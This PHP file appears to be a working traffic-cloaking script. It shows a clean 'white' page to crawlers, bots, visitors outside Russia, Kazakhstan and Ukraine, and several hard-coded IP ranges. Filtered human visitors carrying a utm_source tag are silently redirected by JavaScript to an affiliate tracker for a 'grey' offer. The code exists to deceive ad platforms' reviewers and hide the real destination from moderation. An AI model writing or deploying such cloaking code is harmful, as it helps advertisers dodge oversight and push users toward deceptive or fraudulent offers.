<?php
function ShowWhiteHTML()
{
	$ee = 0;
	require_once 'white2.php';
}

function ShowGreyHTML()
{
	echo '<!doctype><html><header><noscript><meta http-equiv="refresh"content="0; url=/"></noscript>  <style>body {margin: 0;}</style></header><body>';
	if (empty($_GET['utm_source'])) {
		ShowWhiteHTML();
		return;
	}
	$ee = 1;
	//include 'stat.php';
	$a = $_GET['utm_source'];	 
	if(empty(explode("_", $a)[0]))
	{
		ShowWhiteHTML();
		return;
	}
	
	if(empty(explode("_", $a)[1]))
	{
		ShowWhiteHTML();
		return;
	}
	
	if(empty(explode("_", $a)[2]))
	{
		ShowWhiteHTML();
		return;
	}
	
	$s1 = explode("_", $a)[0];
    $s2 = explode("_", $a)[1];
	$s3 = explode("_", $a)[2];
	 
	//echo "<script>window.location = 'http://track.arrogantfruit.com/click?pid=3148&offer_id=234&l=1501588303&sub1=".$s1."&sub2=".$s2."&sub3=".$s3."'</script></body></html>"; 
	//echo "<script>window.location = 'http://tracker.fffgfry.com/tracker?offer_id=866&aff_id=998&aff_sub=".$s1."&aff_sub2=".$s2."&aff_sub3=".$s3."&cb=0'</script></body></html>"; 	
	echo "<script>window.location = 'http://tracker.fffgfry.com/tracker?offer_id=866&aff_id=998&aff_sub=".$s1."&aff_sub2=".$s2."&aff_sub3=".$s3."&cb=0'</script></body></html>";
	//echo "<script>window.location = 'https://helpjob.tk?utm_source=".$a."'</script></body></html>";   
}

function GetCountry()
{
	$ipaddress = $_SERVER['REMOTE_ADDR'];
	
	$a = $ipaddress;
	$a2 = '79.139.192.0';
	$a3 = '79.139.255.255'; 
	$a4 = '37.9.113.0';
	$a5 = '37.9.113.255'; 
	$a6 = '178.154.171.0';
	$a7 = '178.154.171.255';  
	$a8 = '46.0.0.0';
	$a9 = '46.0.31.255';   
	$a10 = '5.228.128.0';
	$a11 = '5.228.255.255'; 
	
	$f1 = ip2long($a);
	$f2 = ip2long($a2);
	$f3 = ip2long($a3);
	$f4 = ip2long($a4);
	$f5 = ip2long($a5);
	$f6 = ip2long($a6);
	$f7 = ip2long($a7);
	$f8 = ip2long($a8);
	$f9 = ip2long($a9);
	$f10 = ip2long($a10);
	$f11 = ip2long($a11);

	if ($f1 <= $f3 && $f2 <= $f1) {
	  return "NONE";
	}
	
	if ($f1 <= $f5 && $f4 <= $f1) {
	  return "NONE";
	}
	
	if ($f1 <= $f7 && $f6 <= $f1) {
	  return "NONE";
	}
	
	if ($f1 <= $f9 && $f8 <= $f1) {
	  return "NONE";
	}
	
	if ($f1 <= $f11 && $f10 <= $f1) {
	  return "NONE";
	}

	$a = json_decode(file_get_contents('https://freegeoip.net/json/'.$ipaddress), true);
	return $a['country_code'];
}

$contry = GetCountry();
if($contry == "RU" || $contry == "KZ" || $contry == "UA") 
{
	require_once 'Mobile_Detect.php';
	$detect = new Mobile_Detect;
	if(!$detect->isBot())
	{
		$a = strtolower($_SERVER['HTTP_USER_AGENT']);

		if(preg_match('/robot|bot|yahoo|mail|crawl|slurp|mediapartners|majesticsEO|facebook|pingdom|trident|yabrowser|get|java|find|dataprovider|spider|crawler|curl|^$/i', $a))
		{
			echo ShowWhiteHTML();
		}
		else  ShowGreyHTML();
	}
	else ShowWhiteHTML();
}
else ShowWhiteHTML();
?>